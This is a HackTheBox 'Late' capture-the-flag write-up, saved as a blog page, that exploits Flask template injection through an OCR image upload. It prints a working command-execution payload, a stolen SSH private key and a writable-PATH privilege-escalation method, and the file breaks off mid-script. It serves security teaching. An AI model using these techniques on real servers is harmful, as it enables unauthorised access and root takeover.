@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Late is an easy machine that has a unique server-side template injection via the image ocr functionality provided by the site.  Once you’re on the box there are two key findings.  First is that the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Late">
+<meta property="og:url" content="https://k1ckstand.github.io/2022/06/08/late/index.html">
+<meta property="og:site_name" content="k1ckstand">
+<meta property="og:description" content="Late is an easy machine that has a unique server-side template injection via the image ocr functionality provided by the site.  Once you’re on the box there are two key findings.  First is that the">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/Late.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/home_page.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/img_to_text_upload.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/maths.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/ls_home.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/ls_svc.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/06/08/late/ssh.png">
+<meta property="article:published_time" content="2022-06-08T18:55:49.000Z">
+<meta property="article:modified_time" content="2022-07-31T19:36:46.554Z">
+<meta property="article:author" content="k1ckstand">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="ssti">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k1ckstand.github.io/2022/06/08/late/Late.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB: Late</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    <!--  -->
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <!-- <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a> -->
+  <span id="menu">
+
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/16/tenable/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <!-- <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k1ckstand.github.io/2022/06/08/late/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k1ckstand.github.io/2022/06/08/late/&text=HTB: Late"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k1ckstand.github.io/2022/06/08/late/&is_video=false&description=HTB: Late"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB: Late&body=Check out this article: https://k1ckstand.github.io/2022/06/08/late/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k1ckstand.github.io/2022/06/08/late/&name=HTB: Late&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k1ckstand.github.io/2022/06/08/late/&t=HTB: Late"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+    <!-- <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-User"><span class="toc-number">1.</span> <span class="toc-text">Getting User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Home-Page"><span class="toc-number">1.1.1.</span> <span class="toc-text">Home Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Page"><span class="toc-number">1.1.2.</span> <span class="toc-text">Upload Page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-Image"><span class="toc-number">1.2.1.</span> <span class="toc-text">First Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-Image"><span class="toc-number">1.2.2.</span> <span class="toc-text">Second Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-Image"><span class="toc-number">1.2.3.</span> <span class="toc-text">Third Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forth-Image"><span class="toc-number">1.2.4.</span> <span class="toc-text">Forth Image</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Root"><span class="toc-number">2.</span> <span class="toc-text">Getting Root</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Path-Abuse"><span class="toc-number">2.1.</span> <span class="toc-text">Write Path Abuse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Making-a-custom-date-command"><span class="toc-number">2.2.</span> <span class="toc-text">Making a custom date command</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">2.3.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+    </div> -->
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+
+
+    <header id="header">
+      <a href="/">
+      
+        
+          <div id="logo" style="background-image: url(/images/finn.png);"></div>
+        
+      
+        <div id="title">
+          <h1>k1ckstand</h1>
+        </div>
+      </a>
+      <div id="nav">
+        <ul>
+          <li class="icon">
+            <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x"></i></a>
+          </li>
+          <!--
+         --><li><a href="/">Home</a></li><!--
+       --><!--
+         --><li><a href="/about/">About</a></li><!--
+       --><!--
+         --><li><a href="/search/">Search</a></li><!--
+       -->
+        </ul>
+      </div>
+    </header>
+    
+
+    <header>
+      
+    <h1 class="posttitle" itemprop="name headline">
+        HTB: Late
+    </h1>
+
+
+
+      <div class="meta">
+        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span itemprop="name">k1ckstand</span>
+        </span>
+        
+    <div class="postdate">
+      
+        <time datetime="2022-06-08T18:55:49.000Z" itemprop="datePublished">2022-06-08</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/HTB/">HTB</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/ssti/" rel="tag">ssti</a>, <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+      </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img src="/2022/06/08/late/Late.png" class="">
+
+<p>Late is an easy machine that has a unique server-side template injection via the image ocr functionality provided by the site.  Once you’re on the box there are two key findings.  First is that the user has write permissions to a folder in the root $PATH.  The second is that a script runs as root every time someone remotes into the box.  The script in question uses several system commands that can be “tricked” into using our own commands by placing them closer to the front of $PATH.</p>
+<hr>
+<h1 id="Getting-User"><a href="#Getting-User" class="headerlink" title="Getting User"></a>Getting User</h1><p>Start out by adding the box to our host file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;10.10.11.156 late.htb&quot; &gt;&gt; /etc/hosts&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Nmap and Gobuster did not provide anything of relevance other than the target is running a web server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92 scan initiated Fri May 20 15:46:11 2022 as: nmap -v -sC -sV -oA scan.namp 10.10.11.156</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.156</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)</span><br><span class="line">|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)</span><br><span class="line">|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Late - Best online image tools</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/local/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri May 20 15:46:27 2022 -- 1 IP address (1 host up) scanned in 15.81 seconds</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/assets               (Status: 301) [Size: 194] [--&gt; http://10.10.11.156/assets/]</span><br></pre></td></tr></table></figure>
+<h3 id="Home-Page"><a href="#Home-Page" class="headerlink" title="Home Page"></a>Home Page</h3><img src="/2022/06/08/late/home_page.png" class="">
+
+<h3 id="Upload-Page"><a href="#Upload-Page" class="headerlink" title="Upload Page"></a>Upload Page</h3><p>Click the link <code>late free online photo editor</code> under the frequently asked questions section. </p>
+<p>As you might expect from looking at the page this site takes an image, reads the text off that image, then provides the text via a download. </p>
+<p>I found the best way to create images that would pars correctly was to simply use the TextEdit app (on mac), then press <code>shift + options + t</code> to change from rich text to plain text.  Next use the screenshot utility to create the image. Using notepad and the snipping tool worked as well on windows.</p>
+<img src="/2022/06/08/late/img_to_text_upload.png" class="">
+
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>Before we get too far into it here is a quick breakdown of the command we’re going to use.</p>
+<p> <code>&#123;&#123; url_for.__globals__.os.popen(“id”).read() &#125;&#125;</code></p>
+<p><code>url_for</code> is a common function used in flask.  It must be imported by the author, in this case it was. <code>url_for</code> is part of <a target="_blank" rel="noopener" href="https://github.com/pallets/flask/blob/main/src/flask/helpers.py">helpers.py</a> which import the <code>os</code> module.  By accessing the <code>__globals__</code> dictionary we kind of “step up” in the python file to access the <code>os</code> module.  From here we just use <code>popen</code> to execute a system command.  A more detailed description can be found in the reference section at the end.</p>
+<h3 id="First-Image"><a href="#First-Image" class="headerlink" title="First Image"></a>First Image</h3><p>Check to see if the site is vulnerable to template injection with <code>&#123;&#123; 7 * 7 &#125;&#125;</code>.</p>
+<img src="/2022/06/08/late/maths.png" class="">
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;49</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>With the response of <code>49</code> we can infer that we have ssti. </p>
+<h3 id="Second-Image"><a href="#Second-Image" class="headerlink" title="Second Image"></a>Second Image</h3><p>Start looking around for users</p>
+<img src="/2022/06/08/late/ls_home.png" class="">
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;total 12K</span><br><span class="line">4.0K drwxr-xr-x  7 svc_acc svc_acc 4.0K Jun  8 18:33 svc_acc/</span><br><span class="line">4.0K drwxr-xr-x 23 root    root    4.0K Apr  7 13:51 ../</span><br><span class="line">4.0K drwxr-xr-x  3 root    root    4.0K Jan  5 10:44 ./</span><br><span class="line"></span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Based off the download we have discovered the user account <code>svc_acc</code></p>
+<p>Technically from here we should be able to get a revers shell but let’s look around a bit first.</p>
+<h3 id="Third-Image"><a href="#Third-Image" class="headerlink" title="Third Image"></a>Third Image</h3><img src="/2022/06/08/late/ls_svc.png" class="">
+
+<p>Lets see what the user <code>scv_acc</code> has in their home directory.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;total 256K</span><br><span class="line"> 24K -rwxrwxr-x 1 svc_acc svc_acc  22K Jun  8 18:33 a.out*</span><br><span class="line">4.0K drwxr-xr-x 7 svc_acc svc_acc 4.0K Jun  8 18:33 ./</span><br><span class="line">8.0K -rw------- 1 svc_acc svc_acc 8.0K Jun  8 18:33 .viminfo</span><br><span class="line"> 24K -rw-rw-r-- 1 svc_acc svc_acc  23K Jun  8 18:33 50135.c</span><br><span class="line">4.0K drwx------ 3 svc_acc svc_acc 4.0K Jun  8 17:20 .gnupg/</span><br><span class="line">160K -rwxrwxr-x 1 svc_acc svc_acc 157K Jun  8 17:19 linpeas.sh*</span><br><span class="line">4.0K drwxrwxr-x 7 svc_acc svc_acc 4.0K Jun  8 16:16 app/</span><br><span class="line">4.0K -rw-r----- 1 root    svc_acc   33 Jun  7 18:03 user.txt</span><br><span class="line">4.0K drwx------ 3 svc_acc svc_acc 4.0K Apr  7 13:51 .cache/</span><br><span class="line">4.0K drwx------ 2 svc_acc svc_acc 4.0K Apr  7 11:08 .ssh/</span><br><span class="line">   0 lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -&amp;gt; /dev/null</span><br><span class="line">4.0K drwxrwxr-x 5 svc_acc svc_acc 4.0K Jan  5 12:13 .local/</span><br><span class="line">4.0K drwxr-xr-x 3 root    root    4.0K Jan  5 10:44 ../</span><br><span class="line">4.0K -rw-r--r-- 1 svc_acc svc_acc 3.7K Apr  4  2018 .bashrc</span><br><span class="line">4.0K -rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile</span><br><span class="line"></span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Forth-Image"><a href="#Forth-Image" class="headerlink" title="Forth Image"></a>Forth Image</h3><img src="/2022/06/08/late/ssh.png" class="">
+
+<p>Snag the ssh private key.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM</span><br><span class="line">HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO</span><br><span class="line">bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi</span><br><span class="line">/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7</span><br><span class="line">d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7</span><br><span class="line">7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM</span><br><span class="line">fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0</span><br><span class="line">ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz</span><br><span class="line">W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ</span><br><span class="line">uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC</span><br><span class="line">T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH</span><br><span class="line">Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi</span><br><span class="line">WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng</span><br><span class="line">Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7</span><br><span class="line">t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq</span><br><span class="line">0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE</span><br><span class="line">uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y</span><br><span class="line">3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ</span><br><span class="line">GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F</span><br><span class="line">ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb</span><br><span class="line">Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr</span><br><span class="line">kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+</span><br><span class="line">Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL</span><br><span class="line">K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0</span><br><span class="line">kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==</span><br><span class="line">-----END RSA PRIVATE KEY-----&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now that we have the private key we can save it to a file and ssh into the box</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i private_key svc_acc@10.10.11.156</span><br><span class="line">svc_acc@late:~$</span><br></pre></td></tr></table></figure>
+
+<h1 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a>Getting Root</h1><p>The next step was to run <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a>.  The first thing linpeas noted was that we had write privileges to <code>/usr/local/sbin/</code>. </p>
+<h2 id="Write-Path-Abuse"><a href="#Write-Path-Abuse" class="headerlink" title="Write Path Abuse"></a>Write Path Abuse</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ PATH</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="comment">#writable-path-abuses</span></span><br><span class="line">/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<p>Taking a look at the system path <code>/usr/local/sbin</code> is close to the front of the line.  Meaning it’s going to be one of the first places Linux is going to look to run commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<p><code>/usr/local/sbin</code> is owned by <code>svc_acc</code> so we can write to it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:~$ <span class="built_in">ls</span> -Flaths /usr/local</span><br><span class="line">total 40K</span><br><span class="line">4.0K drwxr-xr-x  2 svc_acc svc_acc 4.0K Jun 21 21:16 sbin/</span><br><span class="line">4.0K drwxr-xr-x  7 root    root    4.0K Apr  7 13:51 share/</span><br><span class="line">4.0K drwxr-xr-x  2 root    root    4.0K Apr  4 13:20 bin/</span><br><span class="line">4.0K drwxr-xr-x  4 root    root    4.0K Jan 12 09:31 lib/</span><br><span class="line">4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ./</span><br><span class="line">4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ../</span><br><span class="line">4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 etc/</span><br><span class="line">4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 games/</span><br><span class="line">4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 include/</span><br><span class="line">   0 lrwxrwxrwx  1 root    root       9 Aug  6  2020 man -&gt; share/man/</span><br><span class="line">4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 src/</span><br></pre></td></tr></table></figure>
+
+<p>within <code>usr/local/sbin</code> is a <code>ssh-alert.sh</code> script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">cd</span></span><br><span class="line">svc_acc@late:~$ <span class="built_in">ls</span> -Flaths /usr/local/sbin/</span><br><span class="line">total 12K</span><br><span class="line">4.0K drwxr-xr-x  2 svc_acc svc_acc 4.0K Jun 21 21:16 ./</span><br><span class="line">4.0K -rwxr-xr-x  1 svc_acc svc_acc  433 Jun 21 21:16 ssh-alert.sh*</span><br><span class="line">4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ../</span><br></pre></td></tr></table></figure>
+
+<p>Taking a look at the script we see that it’s taking note of when users login.  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">cat</span> ssh-alert.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RECIPIENT=<span class="string">&quot;root@late.htb&quot;</span></span><br><span class="line">SUBJECT=<span class="string">&quot;Email from Server Login: SSH Alert&quot;</span></span><br><span class="line"></span><br><span class="line">BODY=<span class="string">&quot;</span></span><br><span class="line"><span class="string">A SSH login was detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        User:        <span class="variable">$PAM_USER</span></span></span><br><span class="line"><span class="string">        User IP Host: <span class="variable">$PAM_RHOST</span></span></span><br><span class="line"><span class="string">        Service:     <span class="variable">$PAM_SERVICE</span></span></span><br><span class="line"><span class="string">        TTY:         <span class="variable">$PAM_TTY</span></span></span><br><span class="line"><span class="string">        Date:        `date`</span></span><br><span class="line"><span class="string">        Server:      `uname -a`</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;PAM_TYPE&#125;</span> = <span class="string">&quot;open_session&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Subject:<span class="variable">$&#123;SUBJECT&#125;</span> <span class="variable">$&#123;BODY&#125;</span>&quot;</span> | /usr/sbin/sendmail <span class="variable">$&#123;RECIPIENT&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span 